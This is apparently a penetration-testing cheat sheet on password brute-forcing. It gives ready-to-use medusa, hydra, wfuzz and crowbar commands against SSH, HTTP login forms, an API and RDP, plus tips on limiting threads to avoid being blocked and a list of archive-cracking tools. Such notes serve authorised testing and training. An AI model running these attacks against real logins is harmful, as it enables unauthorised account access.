:information_source: Password Lists: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
# medusa
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

# hydra
For ssh try shorter password lists like ``/usr/share/wfuzz/wordlist/others/common_pass.txt``
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-get
# specify number of threads with -t to avoid getting blocked
hydra -l user -P wordlist ssh://10.10.10.10 -f -V -t 3
```
Get help for service module
```
hydra http-form-post -U
```
Example:
```
hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
# use -f to stop the attack once a result is found
```

Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
# wfuzz

``` bash
wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’username=admin&password=FUZZ’ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
wfuzz --hc 404 -c -z file,big.txt http://10.10.26.165/site-log.php\?date=FUZZ
```

# RDP
* [crowbar](https://github.com/galkan/crowbar)
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
In case of error: "File: /usr/share/wordlists/rockyou.txt doesn't exists" it is due encoding issues.
Convert list with:
```
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou_utf8.txt
````

# Archives
Bruteforce password protected .zip or .rar file
* fcrackzip
* rarcrack
* john the ripper => zip2john, rar2john

